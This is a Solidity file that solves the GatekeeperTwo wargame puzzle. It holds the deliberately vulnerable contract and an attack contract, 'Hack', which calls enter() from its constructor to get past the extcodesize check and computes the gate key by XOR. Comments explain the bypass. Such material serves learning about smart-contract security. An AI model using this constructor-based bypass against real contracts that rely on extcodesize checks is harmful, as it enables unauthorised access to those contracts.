// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) } //caller returns the sender address(except in case of delegate), extcodesize returns the size of the code in that address
    require(x == 0); 
    //The above line means that x cannot be a contract, rather it should be an account of someone. But then modifier1 will fail. 
    //This is where constructor's come into play. During a contract's initialization, or when it's constructor is being called, its runtime code size will always be 0.
    //So when we put our exploit logic and call it from inside a constructor, the return value of extcodesize will always return zero. This essentially means that all our 
    //exploit code will be called from inside of our contract's constructor to go through the second gate.
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {

  constructor(GatekeeperTwo _addr) {
    GatekeeperTwo cont = GatekeeperTwo(_addr);
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max));
    cont.enter(key);
  } 

}

//Modifier3 - If A XOR B = C, then A XOR C = B.
//Because A XOR A XOR B = B (property)
